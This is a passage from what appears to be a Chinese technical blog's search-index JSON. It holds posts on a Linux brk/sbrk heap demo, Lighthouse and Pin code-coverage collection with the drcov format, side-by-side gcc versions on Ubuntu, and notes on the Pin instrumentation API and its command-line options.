sbrk(0) gives current program break location */ tmp_brk = curr_brk = sbrk(0); printf(\"Program Break Location1:%p\\n\", curr_brk); getchar(); // 使用getchar来暂停运行，方便观察 /* brk(addr) increments/decrements program break location */ brk(curr_brk+4096); curr_brk = sbrk(0); printf(\"Program break Location2:%p\\n\", curr_brk); getchar(); brk(tmp_brk); curr_brk = sbrk(0); printf(\"Program Break Location3:%p\\n\", curr_brk); getchar(); return 0; } 在第一次调用brk之前 输出如下： ","date":"2021-11-11","objectID":"/2021/11/linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/:1:2","tags":["heap"],"title":"Linux堆内存管理深入分析","uri":"/2021/11/linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/"},{"categories":["Fuzz"],"content":"Lighthouse使用及改进","date":"2021-10-17","objectID":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/","tags":["Fuzz","Instrument","Pin"],"title":"利用Lighthouse进行覆盖率统计及其优化","uri":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/"},{"categories":["Fuzz"],"content":"TL;DR 介绍IDA覆盖率统计插件Lighthouse的使用，并对其覆盖率输出方式进行修改，获得可阅读的明文代码执行路径信息。 ","date":"2021-10-17","objectID":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/:1:0","tags":["Fuzz","Instrument","Pin"],"title":"利用Lighthouse进行覆盖率统计及其优化","uri":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/"},{"categories":["Fuzz"],"content":"1. 背景 最近有统计覆盖率信息的需求，多方搜索后发现IDA插件Lighthouse具有统计覆盖率的功能，通过读取DynamoRIO或者Pin产生的覆盖率日志文件，在IDA中以图形化形式展现代码的详细执行路径。 DynamoRIO或Pin等插桩工具默认使用的日志文件格式为drcov格式，这是一种二进制格式，每个基本块的信息的都是以十六进制数据进行记录。虽然二进制形式的记录方式有利于提高性能，但是人工阅读困难。 ","date":"2021-10-17","objectID":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/:2:0","tags":["Fuzz","Instrument","Pin"],"title":"利用Lighthouse进行覆盖率统计及其优化","uri":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/"},{"categories":["Fuzz"],"content":"2. Lighouse的基本使用 下载：Lighthouse； 安装： 在IDA中找到插件文件的目录： import idaapi, os; print(os.path.join(idaapi.get_user_idadir(), \"plugins\")) 将下载下来的源码中的/plugins/文件夹copy到上面命令执行结果的目录中，然后重启IDA。 获取drcov格式覆盖率统计日志文件： 首先使用Pin或DynamoRIO获取覆盖率统计文件(这里以Pin为例)： 这里需要注意的是，Lighthouse默认使用的drcov文件版本为version 2，但是最新版的DynamoRIO生成的drcov文件的版本为version 3，所以在导入IDA时会提示文件格式错误。Lighthouse目前提供了pin和frida的覆盖率统计插件，DynamoRIO的需要做修改或者使用旧版本的DynamoRIO： IDA中导入日志文件： 首先IDA加载要观察的可执行文件，然后File -\u003e Load file -\u003e Code coverage file... 加载刚刚生成的日志文件： 控制流图的蓝色基本块为执行了的基本块，右侧为coverage的overview信息 同样进行F5之后，可以看到执行过的伪代码： ","date":"2021-10-17","objectID":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/:3:0","tags":["Fuzz","Instrument","Pin"],"title":"利用Lighthouse进行覆盖率统计及其优化","uri":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/"},{"categories":["Fuzz"],"content":"3. drcov文件格式 ","date":"2021-10-17","objectID":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/:4:0","tags":["Fuzz","Instrument","Pin"],"title":"利用Lighthouse进行覆盖率统计及其优化","uri":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/"},{"categories":["Fuzz"],"content":"1. 简介 drcov是基于DynamoRIO框架的用于收集二进制程序覆盖率信息的一种工具，其收集的覆盖率信息格式即为drcov格式。因为其成熟高效的特点，很多进行覆盖率收集的工具都会使用这种格式。 DynamoRIO官方并未对drcov格式进行详细的说明，所以此处进行说明记录，希望能对后续的覆盖率信息收集工具的开发起到一定的作用 ","date":"2021-10-17","objectID":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/:4:1","tags":["Fuzz","Instrument","Pin"],"title":"利用Lighthouse进行覆盖率统计及其优化","uri":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/"},{"categories":["Fuzz"],"content":"2. 详细格式 首先，drcov格式有一个包含一些metadata的头部： DRCOV VERSION: 2 DRCOV FLAVOR: drcov 在Lighthouse中只支持了version 2的格式；DRCOV FLAVOR是一个描述产生覆盖率信息的工具的字符串，并没有具体的实际作用。 然后，是在收集覆盖率信息的过程中加载的模块的映射的模块表： Module Table: version 2, count 39 Columns: id, base, end, entry, checksum, timestamp, path 0, 0x10c83b000, 0x10c83dfff, 0x0000000000000000, 0x00000000, 0x00000000, /Users/ayrx/code/frida-drcov/bar 1, 0x112314000, 0x1123f4fff, 0x0000000000000000, 0x00000000, 0x00000000, /usr/lib/dyld 2, 0x7fff5d866000, 0x7fff5d867fff, 0x0000000000000000, 0x00000000, 0x00000000, /usr/lib/libSystem.B.dylib 3, 0x7fff5dac1000, 0x7fff5db18fff, 0x0000000000000000, 0x00000000, 0x00000000, /usr/lib/libc++.1.dylib 4, 0x7fff5db19000, 0x7fff5db2efff, 0x0000000000000000, 0x00000000, 0x00000000, /usr/lib/libc++abi.dylib 5, 0x7fff5f30d000, 0x7fff5fa93fff, 0x0000000000000000, 0x00000000, 0x00000000, /usr/lib/libobjc.A.dylib 8, 0x7fff60617000, 0x7fff60647fff, 0x0000000000000000, 0x00000000, 0x00000000, /usr/lib/system/libxpc.dylib ... snip ... 模块表的头部有两种变体，都包含模块表中的条目数： Format used in DynamoRIO v6.1.1 through 6.2.0 eg: 'Module Table: 11' Format used in DynamoRIO v7.0.0-RC1 (and hopefully above) eg: 'Module Table: version X, count 11' 每个版本的表格格式有些许不同： DynamoRIO v6.1.1, table version 1: eg: (Not present) DynamoRIO v7.0.0-RC1, table version 2: Windows: 'Columns: id, base, end, entry, checksum, timestamp, path' Mac/Linux: 'Columns: id, base, end, entry, path' DynamoRIO v7.0.17594B, table version 3: Windows: 'Columns: id, containing_id, start, end, entry, checksum, timestamp, path' Mac/Linux: 'Columns: id, containing_id, start, end, entry, path' DynamoRIO v7.0.17640, table version 4: Windows: 'Columns: id, containing_id, start, end, entry, offset, checksum, timestamp, path' Mac/Linux: 'Columns: id, containing_id, start, end, entry, offset, path' 虽然有很多列的数值，但是实际上能于Lighthouse交互的数据只有以下几种： id: 生成模块表时分配的序号，稍后用于将基本块映射到模块。 start, base: 模块开始的内存基地址。 end: 模块结束的内存地址。 path: 模块在硬盘上的存储路径。 最后，日志文件有一个基本块表，其中包含在收集覆盖信息时执行的基本块列表。虽然drcov可以以文本格式转储基本块表（使用-dump_text选项），但它默认以二进制格式转储表。 BB Table: 861 bbs \u003cbinary data\u003e 该表首先是一个表头，表明基本块的数量。后续跟的数据是一个每个8字节大小的__bb_entry_t结构组成的数组，__bb_entry_t的结构如下： typedef struct _bb_entry_t { uint start; /* offset of bb start from the image base */ ushort size; ushort mod_id; } bb_entry_t; 结构解释如下： start: 距离基本块入口开始的模块的基地址的偏移。 size: 基本块的大小。 mod_id: 发现的基本块所在模块的id，与前面模块表中的id是对应的。 基于上面3个元素，就可以知道哪个基本块被执行了，从而作为覆盖率信息进行收集。 ","date":"2021-10-17","objectID":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/:4:2","tags":["Fuzz","Instrument","Pin"],"title":"利用Lighthouse进行覆盖率统计及其优化","uri":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/"},{"categories":["Fuzz"],"content":"3. 修改输出方式为明文(以Pin插件为例) 因为Lighthouse默认输出的覆盖率日志文件时drcov格式的，人工阅读存在一定的困难。在某些场景下，需要直接获得人工易读的代码执行路径信息，所以考虑对Lighthouse的覆盖率统计插件进行修改。 Lighthouse的覆盖率统计功能在如下代码中： # CodeCoverage.cpp static VOID OnFini(INT32 code, VOID* v) { ...snap... drcov_bb tmp; for (const auto\u0026 data : context.m_terminated_threads) { for (const auto\u0026 block : data-\u003em_blocks) { auto address = block.first; auto it = std::find_if(context.m_loaded_images.begin(), context.m_loaded_images.end(), [\u0026address](const LoadedImage\u0026 image) { return address \u003e= image.low_ \u0026\u0026 address \u003c image.high_; }); if (it == context.m_loaded_images.end()) continue; tmp.id = (uint16_t)std::distance(context.m_loaded_images.begin(), it); tmp.start = (uint32_t)(address - it-\u003elow_); tmp.size = data-\u003em_blocks[address]; context.m_trace-\u003ewrite_binary(\u0026tmp, sizeof(tmp)); } } } 首先设置了一个drcov_bb结构tmp，其完整格式如下： struct __attribute__((packed)) drcov_bb { uint32_t start; uint16_t size; uint16_t id; }; 然后进入到一个内外嵌套循环中，在每个内循环中每读到一个bb信息就对tmp结构进行赋值： tmp.id = (uint16_t)std::distance(context.m_loaded_images.begin(), it); tmp.start = (uint32_t)(address - it-\u003elow_); tmp.size = data-\u003em_blocks[address]; 最后调用write_binary函数写入到trace文件中： context.m_trace-\u003ewrite_binary(\u0026tmp, sizeof(tmp)); 而write_binary函数的实现在Trace.h文件中： void write_binary(const void* ptr, size_t size) { if (fwrite(ptr, size, 1, m_file) != 1) { std::cerr \u003c\u003c \"Could not log to the log file.\" \u003c\u003c std::endl; std::abort(); } } 可以看到本质上就是调用fwrite函数进行流操作。此外，还有一个write_string函数： void write_string(const char* format, ...) { va_list args; va_start(args, format); if (vfprintf(m_file, format, args) \u003c 0) { std::cerr \u003c\u003c \"Could not log to the log file.\" \u003c\u003c std::endl; std::abort(); } va_end(args); } 该函数用作想trace文件中写入string格式的数据。这么一来就好办了，直接用现成的即可，只需要修改在写文件时的操作就ok了。修改后的代码如下： // drcov_bb tmp; 这里要注释掉。否则有的环境会报编译不通过 for (const auto\u0026 data : context.m_terminated_threads) { for (const auto\u0026 block : data-\u003em_blocks) { auto address = block.first; auto it = std::find_if(context.m_loaded_images.begin(), context.m_loaded_images.end(), [\u0026address](const LoadedImage\u0026 image) { return address \u003e= image.low_ \u0026\u0026 address \u003c image.high_; }); if (it == context.m_loaded_images.end()) continue; uint16_t id = (uint16_t)std::distance(context.m_loaded_images.begin(), it); uint32_t start_addr = (uint32_t)(address - it-\u003elow_); int size = data-\u003em_blocks[address]; context.m_trace-\u003ewrite_string(\"[+]module: [%d] 0x%08x %d\\n\", id, start_addr, size); } } 这种格式只能用作人工阅读或进一步的处理，没有办法再使用drcov2lcov和genhtml工具进行转换了，最终实现的效果如下： 会以明文形式打印出每个模块的执行的基本块的地址和块大小，这样就方便人工进行阅读，还可以进一步提取出模块执行的地址，进行后续处理。 ","date":"2021-10-17","objectID":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/:5:0","tags":["Fuzz","Instrument","Pin"],"title":"利用Lighthouse进行覆盖率统计及其优化","uri":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/"},{"categories":["LINUX"],"content":"记录一下多版本gcc共存的解决方案。","date":"2021-10-07","objectID":"/2021/10/%E5%A4%9A%E7%89%88%E6%9C%ACgcc%E5%85%B1%E5%AD%98%E6%96%B9%E6%A1%88/","tags":["LINUX","gcc"],"title":"多版本gcc共存方案","uri":"/2021/10/%E5%A4%9A%E7%89%88%E6%9C%ACgcc%E5%85%B1%E5%AD%98%E6%96%B9%E6%A1%88/"},{"categories":["LINUX"],"content":"前言 有时需要进行交叉编译的时候，可能需要在高版本的架构上编译一个低版本的工具来运行到一个旧平台上。高版本的架构一般自带的都是高版本工具，这样编译出来的工具无法在低版本架构上运行，所以就有了多版本编译器共存的情况。这里我们以 gcc 为例简单说一下多版本 gcc 共存的解决方案，其实很简单。 ","date":"2021-10-07","objectID":"/2021/10/%E5%A4%9A%E7%89%88%E6%9C%ACgcc%E5%85%B1%E5%AD%98%E6%96%B9%E6%A1%88/:1:0","tags":["LINUX","gcc"],"title":"多版本gcc共存方案","uri":"/2021/10/%E5%A4%9A%E7%89%88%E6%9C%ACgcc%E5%85%B1%E5%AD%98%E6%96%B9%E6%A1%88/"},{"categories":["LINUX"],"content":"安装低版本gcc/g++ 在高版本的 Linux 上的源里是不能直接 apt 去安装低版本的 gcc/g++ 的，所以这里简单记录下如何在高版本的 Ubuntu 上也可以直接 apt 安装。 换源 既然高版本的源里没有安装包，直接更新一下低版本的源好了。以 gcc-4.8 为例，这里首先把 ubuntu 16.04 的源更新到 /etc/apt/sources.list中去： # official deb http://dk.archive.ubuntu.com/ubuntu/ xenial main deb http://dk.archive.ubuntu.com/ubuntu/ xenial universe # 国内源aliyun deb http://mirrors.aliyun.com/ubuntu/ xenial main deb-src http://mirrors.aliyun.com/ubuntu/ xenial main deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main deb http://mirrors.aliyun.com/ubuntu/ xenial universe deb-src http://mirrors.aliyun.com/ubuntu/ xenial universe deb http://mirrors.aliyun.com/ubuntu/ xenial-updates universe deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates universe deb http://mirrors.aliyun.com/ubuntu/ xenial-security main deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main deb http://mirrors.aliyun.com/ubuntu/ xenial-security universe deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security universe 然后 sudo apt update 一下，把包资源更新进来。 安装 可以先查看一下版本信息：sudo apt-cache policy gcc-4.8 ，作用类似于搜索，下面所有能安装的子版本都会列出来。然后直接 apt install 对应的版本即可。 这种方法不管想安装什么版本的旧软件，只要有对应的更新源即可。 ","date":"2021-10-07","objectID":"/2021/10/%E5%A4%9A%E7%89%88%E6%9C%ACgcc%E5%85%B1%E5%AD%98%E6%96%B9%E6%A1%88/:2:0","tags":["LINUX","gcc"],"title":"多版本gcc共存方案","uri":"/2021/10/%E5%A4%9A%E7%89%88%E6%9C%ACgcc%E5%85%B1%E5%AD%98%E6%96%B9%E6%A1%88/"},{"categories":["LINUX"],"content":"版本控制 第一种方法： 直接在使用时指定 CC 或 CXX，跟上对应版本的 gcc/g++ 的绝对路径即可。个人感觉这样会更方便一点，只要在编译的时候指定一下变量即可。 第二种方法： 设置优先级： $ sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-4.8 40 $ sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-9 90 $ sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++4.8 40 $ sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-9 90 # 数字越大，表示优先级越高，上面的例子中就是优先使用 gcc-9 ，这个具体的数字不用特别关注，只要能体现出来大小来表达优先级就可以。 删除设置的优先级： $ sudo update-alternatives --remove /usr/bin/g+±4.8 切换版本可以通过以下命令： $ sudo update-alternatives --config gcc $ sudo update-alternatives --config g++ 选择对应的数字即可，然后回车即可切换版本。 ","date":"2021-10-07","objectID":"/2021/10/%E5%A4%9A%E7%89%88%E6%9C%ACgcc%E5%85%B1%E5%AD%98%E6%96%B9%E6%A1%88/:3:0","tags":["LINUX","gcc"],"title":"多版本gcc共存方案","uri":"/2021/10/%E5%A4%9A%E7%89%88%E6%9C%ACgcc%E5%85%B1%E5%AD%98%E6%96%B9%E6%A1%88/"},{"categories":["Fuzz"],"content":"Pin学习记录第二篇","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"本文是Pin系列学习记录的第二篇，主要是官方文档的相关内容的整理总结。 ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:0:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"4. Callbacks 这部分主要介绍几个Pin的用于注册回调函数的API： INS_AddInstrumentFunction (INSCALLBACK fun, VOID *val)：注册以指令粒度插桩的函数 TRACE_AddInstrumentFunction (TRACECALLBACK fun, VOID *val)：注册以trace粒度插桩的函数 RTN_AddInstrumentFunction (RTNCALLBACK fun, VOID *val)：注册以routine粒度插桩的函数 IMG_AddInstrumentFunction (IMGCALLBACK fun, VOID *val)：注册以image粒度插桩的函数 PIN_AddFiniFunction (FINICALLBACK fun, VOID *val)：注册在应用程序退出前执行的函数，该类函数不进行插桩，可以有多个。 PIN_AddDetachFunction (DETACHCALLBACK fun, VOID *val)：注册在Pin通过PIN_Detach()函数放弃对应用程序的控制权限之前执行的函数，一个进程只调用一次，可以被任何线程调用，此时Pin的内存并没有释放。 对于每个注册函数的第二个参数val将在“回调”时传递给回调函数。如果在实际的场景中不需要传递第二个参数，为了保证安全，可以传递将val的值设置为0进行传递。val的理想使用方式是传递一个指向类实例的指针，这样回调函数在取消引用该指针前需要将其转换回一个对象。 所有的注册函数都会返回一个PIN_CALLBACK对象，该对象可以在后续过程中用于操作注册的回调的相关属性。 ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:1:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"PIN callbacks manipulation API 在注册函数返回PIN_CALLBACK对象后，可以使用PIN_CALLBACKAPI对其进行操作，来检索和修改在Pin中已注册的回调函数的属性。 声明： typedef COMPLEX_CALLBACKVAL_BASE * PIN_CALLBACK 函数： CALLBACK_GetExecutionOrder() 声明： VOID CALLBACK_GetExecutionOrder (PIN_CALLBACK callback) 作用：获取已注册回调函数的执行顺序。越靠前，越早被执行。 参数：callback，从*_Add*Funcxtion()函数返回的注册的回调函数 CALLBACK_SetExecutionOrder() 声明： VOID CALLBACK_SetExecutionOrder (PIN_CALLBACK callback, CALL_ORDER order) 作用：设置已注册回调函数的执行顺序。越靠前，越早被执行。 参数：callback，从*_Add*Funcxtion()函数返回的注册的回调函数；order，新设置的回调函数的执行顺序。 PIN_CALLBACK_INVALID() 声明： const PIN_CALLBACK PIN_CALLBACK_INVALID(0) PIN回调的无效值。 ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:1:1","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"CALL_ORDER CALL_ORDER是一个枚举类型，预定义了IARG_CALL_ORDER的值。其作用就是当指令有多个分析函数调用时，控制每个分析函数的调用顺序，默认值为CALL_ORDER_DEFAULT。 CALL_ORDER_FIRST：首先执行该调用，整数值为100. CALL_ORDER_DEFAULT：未指定IARG_CALL_ORDER时的默认值，整数值为200. CALL_ORDER_LAST：最后执行该调用，整数值为300. 在进行数值设定时，可以使用类似CALL_ORDER_DEFAULT + 5的格式来设置。 针对在相同插桩回调环境中的针对同一指令的、具备同样CALL_ORDER的多个分析调用，Pin会按照插入的顺序进行调用。 ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:1:2","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"5. Mopdifying Application Instructions 虽然Pin的主要用途是对二进制程序进行插桩，但是它也可以实现对程序指令的修改。 ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:2:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"5.1 实现方式 最简单的实现方式是插入一个分析routine来模拟指令执行，然后调用INS_Delete()来删除指令。也可以通过直接或间接插入程序执行流分支（使用INS_InsertDirectJump和INS_InsertIndirectJump）实现，这种方式会改变程序的执行流，但是会更容易实现指令模拟。 INS_InsertDirectJump() 声明： VOID INS_InsertDirectJump(INS ins, IPOINT ipoint, ADDRINT tgt) 参数： ins：输入的指令 ipoint：与ins相关的location（仅支持IPOINT_BEFORE和IPOINT_AFTER） tgt：target的绝对地址 作用：插入相对于给定指令的直接跳转指令，与INS_Delete()配合使用可以模拟控制流转移指令。 INS_InsertIndirectJump() 声明： VOID INS_InsertIndirectJump ( INS ins, IPOINT ipoint, REG reg) 参数： ins：输入的指令 ipoint：与ins相关的location（仅支持IPOINT_BEFORE和IPOINT_AFTER reg：target的寄存器 作用：插入相对于给定指令的间接跳转指令，与INS_Delete()配合使用可以模拟控制流转移指令。 ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:2:1","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"5.2 指令内存修改 对于原始指令使用到的内存的访问，可以通过使用INS_RewriteMemoryOperand来引用通过分析routine计算得到的值来替代。 需要注意的是，对于指令的修改操作，会在所有的指令插桩操作完成后进行，因此在进行指令插桩时，插桩routine看到的都是原始的、没有经过修改的程序指令。 INS_RewriteMemoryOperand() 声明： VOID INS_RewriteMemoryOperand(INS ins, UINt32 memindex, REG newBase) 参数： ins：输入指令 memindex：控制需要重写的内存操作数（0，1，…） newBase：包含新操作数地址的寄存器，通常是通过PIN_ClainToolRegister分配的临时寄存器 作用：更改此内存访问指令以饮用包含在给定特定寄存器中的虚拟内存地址。 在IA-32和Intel 64平台上，修改后的操作数仅使用具有新基址寄存器newBase的基址寄存器进行寻址。原始指令中该操作数的任何index， scale或者offset filed都会被删除。 该函数可以用于重写内存操作数，包括隐式的（如call、ret、push、pop），唯一不能重写的指令是第二个操作数大于0的enter。 newBase中的地址是中是该操作数将访问的最低地址，如果操作数在内存访问之前被指令修改，如push，则newBase中的值将不是堆栈指针，而是指令访问的内存地址。 用于内存地址重写的一个样例插桩代码如下： // 映射originalEa到一个翻译后的地址 static ADDRINT ProcessAddress(ADDRINT originalEa, ADDRINT size, UINT32 access); ... for (UINT32 op = 0; op\u003cINS_MemoryOperandCount(ins); op++) // 首先遍历内存操作指令进行计数 { UINT32 access = (INS_MemoryOperandIsRead(ins,op) ? 1 : 0) | // 判断是内存读还是内存写 (INS_MemoryOperandIsWritten(ins,op) ? 2 : 0); INS_InsertCall(ins, IPOINT_BEFORE, AFUNPTR(ProcessAddress), IARG_MEMORYOP_EA, op, IARG_MEMORYOP_SIZE, op, IARG_UINT32, access, IARG_RETURN_REGS, REG_INST_G0+i, IARG_END); // 在指令处进行插桩 INS_RewriteMemoryOperand(ins, i, REG(REG_INST_G0+i)); // 重写内存指令的操作数 } ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:2:2","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"6. Applying a Pintool to an Application 命令行： pin [pin-option]... -t [toolname] [tool-options]... -- [application] [application-option].. ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:3:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"6.1 Pin Cmdline Options 如下是Pin的命令行的完整option列表： Option Description -follow_execv 使用Pin执行由execv类系统调用产生的所有进程 -help 帮助信息 -pause_tool 暂停并打印PID以可以在tool加载后attach到debugger，处理过程在‘n’秒后重启 -logfile 指定log文件的名字和路径，默认路径为当前工作目录，默认文件名为pin.log -unique_logfile 添加pid到log文件名中 -error_file 指定error文件的名字和路径，默认路径为当前工作目录。如果设置了error文件，则所有error都会写入到文件中，并且不会在console中显示。如果没有指定，则不创建文件。 -unique_error_file 添加pid到error文件名中 -injection 的选项为dynamic， self， child， parent，只能在UNIX中使用，详看Injection，默认使用dynamic。 -inline 内联简单的分析routine -log_inline 在pin.log文件中记录哪些分析routine被设置成了内联 -cc_memory_size 最大代码缓存，字节为单位。0为默认值，表示不做限制。必须设置为代码缓存块大小的对齐倍数。 -pid \u003cpid #\u003e 使用Pin和Pintool attach一个正在运行的进程 -pin_memory_range 限制Pin到一个内存范围内，0x80000000:0x90000000 or size: 0:0x10000000. -restric_memory 阻止Pin的动态加载器使用该地址范围：0x10000000:0x20000000 -pin_memory_size 限制Pin和Pintool可以动态分配的字节数。Pin分配的字节数定义为Pin分配的内存页数乘以页大小。 -tool_load_option 加载有附加标志的tool。 -t 指定加载的Pintool。 -t64 \u003c64-bit toolname\u003e 指定针对Intel 64架构的64-bit的Pintool。 -p32 指定IA-32架构下的Pintool -p64 指定针对Intel 64架构的Pintool -smc-support 是否开启app的SMC功能，1开启，0关闭。默认开启 -smc_strict 是否开启基本块内部的SMC，1开始，0关闭。默认关闭 -appdebug 调试目标程序，程序运行后立即在debugger中断下 -appdebug_enable 开启目标程序调试功能，但是在程序运行后不暂停 -appdebug_silent 当程序调试功能开启时，Pin打印消息告知如何连接外部debugger。但是在-appdebug_connection选项开启时不打印。 -appdebug_exclude 当程序调试功能开启，并指定了-follw_execv时，默认在所有子进程上启用调试。 -appdebug_allow_remote 允许debugger与Pin不运行在同一系统上，而是以远程方式进行连接。指定 -appdebug_connection 时会忽略该选项的值，因为 -appdebug_connection 